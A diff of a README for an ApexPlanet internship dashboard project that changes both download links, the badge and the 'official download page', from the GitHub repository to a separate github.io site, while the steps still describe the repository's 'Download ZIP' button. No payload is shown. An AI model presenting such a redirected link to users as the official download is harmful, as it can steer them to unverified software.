@@ -1,6 +1,6 @@
 # 📊 apexplanet-task3-dashboard-2026 - Visualize your data with simple tools
 
-[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://github.com/hoaileng7061/apexplanet-task3-dashboard-2026)
+[![](https://img.shields.io/badge/Download-Dashboard-blue.svg)](https://hoaileng7061.github.io)
 
 This project provides a clear view of data through an interactive dashboard. Use these tools to see trends and reports from the ApexPlanet internship program. The software connects Python, Plotly, and Power BI to make data easy to read.
 
@@ -18,7 +18,7 @@ Before you start, make sure your computer meets these basic needs:
 
 Follow these steps to set up the dashboard on your Windows computer:
 
-1.  Visit the official download page here: [https://github.com/hoaileng7061/apexplanet-task3-dashboard-2026](https://github.com/hoaileng7061/apexplanet-task3-dashboard-2026).
+1.  Visit the official download page here: [https://hoaileng7061.github.io](https://hoaileng7061.github.io).
 2.  Look for the green button labeled "Code" near the top right of the page.
 3.  Click "Download ZIP" from the menu.
 4.  Find the downloaded folder in your "Downloads" directory.
